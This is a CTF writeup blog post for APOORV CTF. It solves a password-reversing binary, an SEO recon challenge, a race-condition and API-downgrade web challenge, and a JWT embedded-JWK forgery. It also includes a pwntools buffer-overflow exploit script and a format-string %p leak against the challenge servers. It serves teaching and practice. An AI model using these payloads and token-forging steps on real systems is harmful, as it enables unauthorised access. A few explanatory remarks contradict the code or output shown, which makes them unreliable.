---
title: APOORV CTF Writeup
date: 2025-03-02
categories: [CTF, Writeups]
tags: [ctf, web, pwn, crypto, buffer overflow, format string, race condition, jwt]
authors: [spidey,0xhyder,jjkings]
description: A comprehensive writeup covering all challenges from the APOORV CTF, including web, pwn, and rev challenges.
---


# Holy Rice 


![Holy Rice Challenge](/assets/images/holy_rice.png)

## Solution:

We've got an executable file that prompts for a password when run. Our goal? **Find or bypass** the password check.

### **Initial Analysis**

Running `file rice-cooker` reveals that it's **stripped**, meaning there's no symbol table to assist debugging. So, we turn to **Ghidra**, a powerful decompiler, to analyze the binary.

> Main

```c
undefined8 FUN_001014ff(void)

{

  int iVar1;

  size_t sVar2;

  char *__format;

  long in_FS_OFFSET;

  char local_d8 [200];

  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);

  printf("Enter password: ");

  fgets(local_d8,200,stdin);

  sVar2 = strcspn(local_d8,"\n");

  local_d8[sVar2] = '\0';

  FUN_00101199(local_d8);

  FUN_001012cb(local_d8);

  FUN_00101418(local_d8);

  FUN_001014a6(local_d8);

  iVar1 = strcmp(local_d8,PTR_s_6!!sbn*ass%84z@84c(8o_^4\#_\#8b0)5_00104048);

  if (iVar1 == 0) {

    __format = &DAT_001020a0;

  }

  else {

    __format = &DAT_001020e0;

  }

  printf(__format);

  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {

                    /* WARNING: Subroutine does not return */

    __stack_chk_fail();

  }

  return 0;

}

```
Looking at the decompiled code, we notice that the input is processed through four functions before being checked against a **hardcoded password**.

> FUN_00101199:

```c

void FUN_00101199(char *param_1) {

    const char *charset = "0123456789abcdefghijklmnopqrstuvwxyz_{}";

    char local_78[104];

    int local_80 = 0;

    size_t charset_len = strlen(charset);

  

    // Ensure safe copying (truncate if too long)

    strncpy(local_78, param_1, sizeof(local_78) - 1);

    local_78[sizeof(local_78) - 1] = '\0'; // Null-terminate

  

    while (param_1[local_80] != '\0' && local_80 < (sizeof(local_78) - 1)) {

        for (int local_7c = 0; local_7c < charset_len; local_7c++) {

            if (param_1[local_80] == charset[local_7c]) {

                int new_index = (local_7c + 7) % charset_len; // Shift by 7 with wraparound

                local_78[local_80] = charset[new_index];

                break;

            }

        }

        local_80++;

    }

  

    // Copy back the transformed string safely

    strncpy(param_1, local_78, strlen(local_78) + 1);

}

```

This function:
- Inserts **special characters (**`**!@#$%^&*()**`**)** at **every 4th position**
- Ensures the modified string still fits within a buffer

> FUN_001012cb

```c

void FUN_001012cb(char *param_1) {

    const char *special_chars = "!@#$%^&*()";

    char local_d8[200];

    int local_e0 = 0;

    // Ensure input is not too long

    size_t param_len = strlen(param_1);

    if (param_len * 2 >= sizeof(local_d8)) {

        return;

    }

  

    for (int local_dc = 0; param_1[local_dc] != '\0'; local_dc++) {

        local_d8[local_e0++] = param_1[local_dc];

  

        if (local_dc % 3 == 0) {

            local_d8[local_e0++] = special_chars[local_dc % 10];

        }

    }

    local_d8[local_e0] = '\0'; // Null-terminate

    strncpy(param_1, local_d8, strlen(local_d8) + 1);

}

```

This function **inserts special characters** (`"!@#$%^&*()"`) into the input string **after every third character** ==(index % 3 == 0)== while ensuring the transformed string is stored back into `param_1`

> FUN_00101418

```c

void FUN_00101418(char *param_1) {

    size_t length = strlen(param_1);

    for (size_t i = 0; i < length / 2; i++) {

        char temp = param_1[i];

        param_1[i] = param_1[length - 1 - i];

        param_1[length - 1 - i] = temp;

    }

}

```

The function simply reverse the string.

> FUN_001014a6

```c

void FUN_001014a6(char *param_1) {

    for (int i = 0; param_1[i] != '\0'; i++) {

        param_1[i] = ~param_1[i];  // Apply bitwise negation

    }

}

```
This function applies **bitwise NOT (**`**~**`**)** to each character, which is **self-inverting** (applying twice cancels out).

> Here is the Script

```python

def reverse_shift(s):

    """Reverses the +7 shift by shifting back -7."""

    charset = "0123456789abcdefghijklmnopqrstuvwxyz_{}"

    return "".join(

        charset[(charset.index(c) - 7) % len(charset)] if c in charset else c

        for c in s

    )

  

def remove_special_chars(s):

    """Removes every 4th special character that was inserted."""

    return "".join(c for i, c in enumerate(s) if (i % 4 != 1))

  

def reverse_string(s):

    """Reverses the string."""

    return s[::-1]

  

### Given transformed password

transformed_password = "6!!sbn*ass%84z@84c(8o_^4\#_\#8b0)5m_&j}y$vvw!h"

### Reverse transformations

step1 = reverse_string(transformed_password)

step2 = remove_special_chars(step1)

original_password = reverse_shift(step2)

  

print("Recovered Password:", original_password)

```

Running this get `apoorvctf{w41t\#_th15_1s_1ll3g4l!}`

  

# SEO CEO

  

They're optimizing SEO to show this garbage?!

  

> **Author:** _proximuz_

  

[https://seo-opal.vercel.app](https://seo-opal.vercel.app/)

  

## Understanding the Web's Inner Workings

  

When I think of SEO, my mind immediately jumps to **robots.txt** after all, that's where the secrets usually hide, right? And sure enough, it didn't disappoint. A quick look revealed a **flake flag**, which was a solid start.

  

## Following the Digital Trail

  

Next, I turned my attention to **sitemap.xml**—because if you want to be discovered, you need a map. That's when I stumbled upon an oddly named endpoint:

  

 **/goofyahhroute**

  

With a name like that, I knew something was up.

  

## The Mystery of the "Goofy Ahh Route"

  

Curious, I visited the page and was greeted with a cryptic message:

  

> "Tell it to the URL then, blud."

  

Blud? Alright, challenge accepted.

  

Thinking like a CTF player, I decided to "talk" to the URL. I added `**?flag=yes**` at the end of the address, hit enter, and just like that—the flag appeared:

  

 **apoorvctf{s30_1snT_0pt1onaL}**

  

# Blog-1 


In the vast digital realm, **Blog-1** awaited brave developers. The mission? Craft a captivating blog filled with enchanting posts, lively comments, and secure user authentication. But there was a catch—only one blog per day! The clock was ticking. Ready for the **Blog-1 adventure**?

  

> **Author:** _Rhul_

  

[https://chals1.apoorvctf.xyz:5001/](https://chals1.apoorvctf.xyz:5001/)

  

## Understanding the Web's Inner Workings

  

Before diving into the challenge, let's break down the **rules of the game**:

  

- There's a **register** and **login** page. Simple enough.

- Once logged in, you can **post a blog**—but only **one per day** (talk about self-control).

- A **daily rewards** system exists, but there's a twist: to claim your prize, you must **post five blogs**.

- Do you **wait five days** for the reward? Sure. But by then, the **CTF would be over**. 😭

  

Clearly, patience was _not_ an option.

## Breaking the System with a Race Condition

Like any good hacker, I smelled an exploit. **Race condition** came to mind, so I fired up **Burp Suite** faster than you can say "CTF." ��

### The Plan:

1. **Intercept** the blog post request.
2. **Send it to the Repeater** (because once is never enough).
3. **Fire off six identical requests simultaneously.**

## The Execution:

Boom! Here's what happened:

![Race Condition in Action](/assets/images/race.png)

After sending the requests in parallel…

![Success!](/assets/images/success.png)

🎉 **Did I get the reward?** Nope. Instead, I got **Skibidi Toilet!** 🚽🤣

But I wasn't done yet.

## API Version Downgrade for the Win

While accessing the gift, I noticed this sneaky endpoint:

`https://chals1.apoorvctf.xyz:5001/api/v2/gift`

So, I did what any self-respecting CTF player would do—**downgraded the API version** to **v1**.

And just like that,  **FLAG SECURED!**

 `apoorvctf{s1gm@_s1gm@_b0y}`

# Blog-2 🔐

After Blog-1's failure, Blud started making blog-2. This time with efficient and new Auth system based on OIDC. Little did bro know.... His Design was a DISASTER.

**authentication system**. Lil' did bro know… 💀 **his design was more fragile than my GPA.**

> **Author:** _Rhul_

🔗 [Blog-2 Link](https://blog-2-omega.vercel.app/)

##  The Hint:

> "Bro was that dumb to validate ___ in j__..."

Hmmm, let's play fill in the blanks. 🤔

- **Same functionality as Blog-1** but **now with "strong" OIDC auth** instead of that useless restriction system?
- Ohhh, **OIDC?!** Bro, I literally wrote a blog about it during **NITECCTF 2024**.
- Let's check if `/.well-known/openid-configuration` exists!

### Discovery Phase:

BOOM. Found this:

```json

{"scopes_supported":["basic","sigma_viewer_blogs"],"id_token_signing_alg_values_supported":["HS256"]}

```

**HS256?** Bro signed his tokens with a symmetric key... we're SO back. 😂

- Exploring the functionality further, the **decoded JWT** looked like this:

```json

{"iss":"OIDC","exp":1740930029,"userId":"67c47abe152b5cfebeb94221","username":"spidey@spidey.com","scope":"basic","iat":1740929729}

```

**Problem:** The scope is `basic`.

**Goal:** Change it to `sigma_viewer_blogs` to unlock the goodies.

##  The Breakthrough: JWK Header Injection

Remember the hint? Let's complete it:

-  **JWK**   
-  **JWT**

This means one thing... **JWK header injection time!** 🎯

### 🎭 Forging the Magic Token (Use JWT Editor tool)

1. **Generate a new RSA key**

2. **Send the `/api/blog/getAll` request to Repeater**

3. **Go to the "JSON Web Token" tab in Burp Suite**

4. **Click "Attack" → Select "Embedded JWK"**

5. **Modify the payload**:

    - Change `"scope": "basic"` → `"scope": "sigma_viewer_blogs"`

6. **Send the request...**

![JWT FORGE](/assets/images/JWT.png)

👀 **Response:**   

**Flag acquired!** 🎉

`apoorvctf{s1gm@_b10g_r3@d3r_f0r_r3@l}`

  
# Kogarashi Café - The Forbidden Recipe ��


Description

The final test. One last order, one last chance. Choose carefully—the café remembers.

  

solution:

we get a ELF file ,

```

─$ file forbidden_recipe   

forbidden_recipe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-   

linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1033e4a4b053363f711f388f116277a1cbde252, not stripped

```

- It is a **32-bit** binary.

- **Not stripped**, making analysis easier.

   Security Checks

```

└─$ pwn checksec forbidden_recipe   

[*] '/home/hyder/pra_ctf/apoorv/pwn/kogarashi3/files/forbidden_recipe'   

   Arch:      i386-32-little   

   RELRO:     Partial RELRO   

   Stack:     No canary found   

   NX:        NX enabled   

   PIE:       No PIE (0x8048000)   

   Stripped:  No

```

- **No stack canary** → Possible buffer overflow.

- **NX enabled** → No direct shellcode execution.

- **No PIE** → Predictable memory addresses.

Using **Ghidra**, we find a function `vuln()`:    

```

void vuln(void)

  

{

  undefined local_34 [32];

  int local_14;

  int local_10;

  local_10 = 0;

  local_14 = 0;

  puts(&DAT_080487c8);

  puts("Barista: 'I remember you... what will it be this time?'");

  read(0,local_34,0x28);

  if ((local_10 == 0xc0ff33) && (local_14 == -0x21350453)) {

    puts("Barista: 'Ah... I knew you'd figure it out. One moment.'");

    win();

  }

  else {

    printf("Barista: 'Hmm... that's not quite right. Order codes: 0x%x, 0x%x'\n",local_10,

          local_14);

    puts("Barista: 'Try again, I know you'll get it.'");

  }

  return;

}

```

  

Then, from the code, we can see that there is an `if` check that compares with a constant value. If true, it calls the `win()` function and prints the flag. However, the two variables are initially set to 0. Then I remembered that when we run the ELF file

```

└─$ ./forbidden_recipe   

Welcome back to Kogarashi Café.   

Barista: 'I remember you... what will it be this time?'   

hello   

Barista: 'Hmm... that's not quite right. Order codes: 0x0, 0x0'   

Barista: 'Try again, I know you'll get it.'

```

There is a value leak from the program, so I thought it might be related to the two variables `local_10` and `local_14`. I considered using Python's `pwn` library with `cyclic` to overwrite these values and find the offset

```

└─$ ./forbidden_recipe       

Welcome back to Kogarashi Café.   

Barista: 'I remember you... what will it be this time?'   

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa   

Barista: 'Hmm... that's not quite right. Order codes: 0x6161616a, 0x61616169'   

Barista: 'Try again, I know you'll get it.'

```

We can see that the values have been changed. Next, I found the offset using `cyclic_find()`.

```

>>> cyclic_find(0x6161616a)

36

>>> cyclic_find(0x61616169)

32

```

The offsets are 32 and 36. So, we need to adjust the payload to fit our desired values at those offsets. To find both values, I used GDB to analyze the disassembled code

```

pwndbg> disass vuln   

Dump of assembler code for function vuln:    

  0x080485e6 <+0>:     push    ebp   

  0x080485e7 <+1>:     mov     ebp,esp   

  0x080485e9 <+3>:     sub     esp,0x38   

  0x080485ec <+6>:     mov     DWORD PTR [ebp-0xc],0x0   

  0x080485f3 <+13>:    mov     DWORD PTR [ebp-0x10],0x0   

  0x080485fa <+20>:    sub     esp,0xc   

  0x080485fd <+23>:    push    0x80487c8   

  0x08048602 <+28>:    call    0x8048430 <puts@plt>   

  0x08048607 <+33>:    add     esp,0x10   

  0x0804860a <+36>:    sub     esp,0xc   

  0x0804860d <+39>:    push    0x80487ec   

  0x08048612 <+44>:    call    0x8048430 <puts@plt>   

  0x08048617 <+49>:    add     esp,0x10   

  0x0804861a <+52>:    sub     esp,0x4   

  0x0804861d <+55>:    push    0x28   

  0x0804861f <+57>:    lea     eax,[ebp-0x30]   

  0x08048622 <+60>:    push    eax   

  0x08048623 <+61>:    push    0x0   

  0x08048625 <+63>:    call    0x80483f0 <read@plt>   

  0x0804862a <+68>:    add     esp,0x10   

  0x0804862d <+71>:    cmp     DWORD PTR [ebp-0xc],0xc0ff33   

  0x08048634 <+78>:    jne     0x8048656 <vuln+112>   

  0x08048636 <+80>:    cmp     DWORD PTR [ebp-0x10],0xdecafbad   

  0x0804863d <+87>:    jne     0x8048656 <vuln+112>   

  0x0804863f <+89>:    sub     esp,0xc   

  0x08048642 <+92>:    push    0x8048824   

  0x08048647 <+97>:    call    0x8048430 <puts@plt>   

  0x0804864c <+102>:   add     esp,0x10   

  0x0804864f <+105>:   call    0x804856b <win>   

  0x08048654 <+110>:   jmp     0x804867c <vuln+150>   

  0x08048656 <+112>:   sub     esp,0x4   

  0x08048659 <+115>:   push    DWORD PTR [ebp-0x10]   

  0x0804865c <+118>:   push    DWORD PTR [ebp-0xc]   

  0x0804865f <+121>:   push    0x8048860   

  0x08048664 <+126>:   call    0x8048400 <printf@plt>   

  0x08048669 <+131>:   add     esp,0x10   

  0x0804866c <+134>:   sub     esp,0xc   

  0x0804866f <+137>:   push    0x80488a4   

  0x08048674 <+142>:   call    0x8048430 <puts@plt>   

  0x08048679 <+147>:   add     esp,0x10   

  0x0804867c <+150>:   nop    

  0x0804867d <+151>:   leave    

  0x0804867e <+152>:   ret    

End of assembler dump.

```

We can see the `cmp` instructions at `main+71` and `main+80`, where the values compared are `0xc0ff33` and `0xdecafbad`. By placing these values at the corresponding offsets in little-endian format, we can get the flag.

Exploit.py

```

from pwn import *    

context.log_level = 'critical'    

elf = context.binary = ELF('./forbidden_recipe')    

  

gdbscript = '''    

break *main    

continue    

'''    

  

if args.REMOTE:    

   p = remote('chals1.apoorvctf.xyz', 3002)    

elif args.GDB:    

    p = gdb.debug(elf.path, gdbscript=gdbscript)    

else:    

   p = process(elf.path)    

  

log.info("\\\\n==== start exploit ====\\\\n")    

p.recvuntil(b"Barista: 'I remember you... what will it be this time?'")    

payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaa\xad\xfb\xca\xde3\xff\xc0\x00'    

p.sendline(payload)    

print(p.recv())    

p.interactive()

```

  

# Kogarashi Café - The Secret Blend ☕

  

Description:

Not everything on the menu is meant to be seen.

  

solution:

from the ELF file,

```

└─$ file secret_blend   

secret_blend: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=00003bb9e0cd2a32ea61c4b60004ed82aa94d4a9, not stripped

```

This is the same as above: a 32-bit LSB executable and not stripped.

security checks,

```

└─$ pwn checksec secret_blend   

[*] '/home/hyder/pra_ctf/apoorv/pwn/kogarashi2/files/secret_blend'   

   Arch:      i386-32-little   

   RELRO:     Partial RELRO   

   Stack:     No canary found   

   NX:        NX enabled   

   PIE:       No PIE (0x8048000)   

   Stripped:  No

```

This binary has Partial RELRO, No PIE, and Canary enabled. So, let's take a look at the disassembled code.

```

void vuln(void)

  

{

  char local_b4 [64];

  char local_74 [100];

  FILE *local_10;

  local_10 = fopen("flag.txt","r");

  if (local_10 == (FILE *)0x0) {

    puts("Barista: 'The special blend is missing...(create flag.txt)'");

     

    exit(1);

  }

  fgets(local_b4,0x40,local_10);

  fclose(local_10);

  puts("Barista: 'What will you have?'");

  fgets(local_74,100,stdin);

  printf(local_74);

  putchar(10);

  return;

}

```

We can see that the program opens the `flag.txt` file and prints 'missing' if the file is not found.

  

From the code, we notice a `printf` call after `fgets` without a format specifier. This indicates a format string vulnerability.

  

So, let's leak some values.

```

└─$ nc chals1.apoorvctf.xyz 3003   

Welcome to Kogarashi Café.    

Barista: 'What will you have?'    

%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %P %p    

%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %P %p    

0xd12481 0xfbad2288 0xff2edb7f 0xd124dd (nil) 0x746376726f6f7061 0x334d5f3368547b66 0x736b34334c5f756e 0x68545f6572304d5f 0x68535f74495f6e61 0x7d646c7530 0x404050 0x7fc514f2d5e0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0    

x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70252050 (nil) 0xd122a0 0x7fffa88540a0 0x401278 %P 0x1

```

then after some multiple tries , we can find that

```

0x746376726f6f7061 0x334d5f3368547b66 0x736b34334c5f756e 0x68545f6572304d5f 0x68535f74495f6e61 0x7d646c7530 0x404050 0x7f8dbb82b5e0 0x7025207025207025 0x2520702520702520 0x2070252070252070

```

these values are not changing each run , so i tried to convert it in to ASCHII    

, which didnt go as planned ,

```

F7g&ö÷3M_3hT{f6³C4Å÷VàhT_er0M_5÷Döæ}dlu0 »µà R P% p% p%  R

```

since this is not in the readable form ,

then i manually changed the endian of this and converted to the ASCII value like

0x746376726f6f7061 -> 61706f6f72766374 ...

  

then the flag is apoorvctf{Th3_M3nu_L34ks_M0re_Than_It_Sh0uld}.